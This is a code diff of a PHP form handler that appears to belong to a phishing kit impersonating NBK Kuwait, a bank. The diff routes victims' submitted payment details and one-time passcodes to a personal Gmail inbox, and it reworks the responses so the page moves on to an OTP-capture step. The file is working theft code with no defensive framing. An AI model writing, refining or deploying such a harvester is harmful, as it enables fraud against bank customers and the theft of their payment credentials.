@@ -2,8 +2,7 @@
 
 header("Access-Control-Allow-Origin: https://nbkkuwait.com");
 
-$to = "hassankiwan92@gmail.com";
-$sender="admin@nbkkuwait.com";
+
 
 
 if(isset($_POST)) {
@@ -17,7 +16,8 @@ if(isset($_POST)) {
 }
 
 function sendtEmailPatment($data) {
-    global $to, $sender;
+    $to = "hassankiwan92@gmail.com";
+    $sender="admin@nbkkuwait.com";
     $subject = "Payment Info";
     $message = "";
     foreach ($data as $key => $msg) {
@@ -30,17 +30,21 @@ function sendtEmailPatment($data) {
     // Send the email
     if (mail($to, $subject, $message, $headers)) {
         // Redirect if using GET only
-        header("Location: ./otp.php", true, 303); // Use 303 to change to GET
+        echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
         exit;
     } else {
-        echo "Failed to send email.";
+        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
+      
     }
+    exit;
 }
 
 
 
+
 function sendOTP($data){
-    $to = "recipient@example.com";
+    $to = "hassankiwan92@gmail.com";
+    $sender="admin@nbkkuwait.com";
     $subject = "OTP";
     $message="";
     foreach($data as $key=>$msg){
@@ -52,9 +56,13 @@ function sendOTP($data){
     
     // Send the email
     if (mail($to, $subject, $message, $headers)) {
-        echo "successfully!";
+        // Redirect if using GET only
+        echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
+        exit;
     } else {
-        echo "Failed.";
+        echo json_encode(['status' => 'error', 'message' => 'Failed.']);
+      
     }
+    exit;
 }
 ?>
